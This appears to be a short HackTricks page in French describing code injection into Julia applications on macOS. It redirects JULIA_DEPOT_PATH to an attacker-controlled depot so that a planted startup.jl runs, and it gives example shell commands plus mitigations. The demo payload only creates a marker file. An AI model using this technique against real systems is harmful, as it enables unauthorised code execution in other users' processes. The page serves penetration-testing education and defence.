# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` et `startup.jl`

Julia exécute normalement `config/startup.jl` depuis son premier depot au démarrage. `JULIA_DEPOT_PATH` contrôle la liste des depots ; le pointer vers une arborescence accessible en écriture par l’attaquant redirige le fichier de démarrage chargé automatiquement.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Le séparateur final est utile lorsque la victime a encore besoin de ses packages habituels. `julia --startup-file=no` désactive ce fichier de démarrage. Effacez la variable avant le lancement, car elle contrôle également les registres de packages, les environnements, les caches et les emplacements de chargement du code.

## References

- [1] [Julia command-line interface : Fichier de démarrage](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Variables d’environnement Julia : `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
